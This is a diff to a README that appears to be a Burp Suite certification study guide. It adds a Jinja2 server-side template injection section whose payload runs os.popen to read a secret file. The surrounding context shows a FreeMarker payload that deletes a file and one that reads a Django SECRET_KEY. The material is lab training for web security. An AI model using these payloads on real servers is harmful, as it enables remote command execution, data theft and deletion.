@@ -68,6 +68,7 @@ Kudos to https://github.com/botesjuan/ for this awesome image, that defines poss
 [Path Traversal](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal)  
 [Admin panel - Download report as PDF SSRF](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel---download-report-as-pdf-ssrf)  
 [Admin panel - RFI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi)  
+[Admin panel - SSTI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-password-reset-email-ssti)  
 
 
 ## Tips
@@ -802,6 +803,17 @@ ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
 ```
 {{settings.SECRET_KEY}}
 ```
+
+
+### 6. Admin panel Password Reset Email SSTI
+>Jinja2  
+
+![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)  
+```
+newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
+&csrf=csrf
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
 
 
 # Directory traversal
